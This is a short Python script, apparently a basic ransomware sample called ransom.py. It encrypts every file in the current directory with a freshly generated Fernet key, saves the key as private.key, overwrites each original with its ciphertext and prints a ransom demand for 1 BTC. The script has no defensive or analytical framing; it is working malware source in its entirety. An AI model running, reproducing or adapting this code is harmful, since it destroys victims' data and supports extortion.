#!/usr/bin/python3

import os 
from cryptography.fernet import Fernet

# creating a file to encrypt
#creating empty list 
newfile =[]

for file in os.listdir():
	#which means anything that is a directory will not be included
	if os.path.isfile(file):
		#excluding ransom.py file out the result 
		if file != "ransom.py" and file != "private.key":
				newfile.append(file)

#creating the encryption key
key = Fernet.generate_key()

open("private.key","wb").write(key)

#encrypting the victim files 

for file in newfile:
	content=open(file,"rb").read()
	encrypted_content= Fernet(key).encrypt(content)
	newcontent =open(file,"wb").write(encrypted_content)


print("Your files are been encrypted sent me 1 BTC to unlock your files")









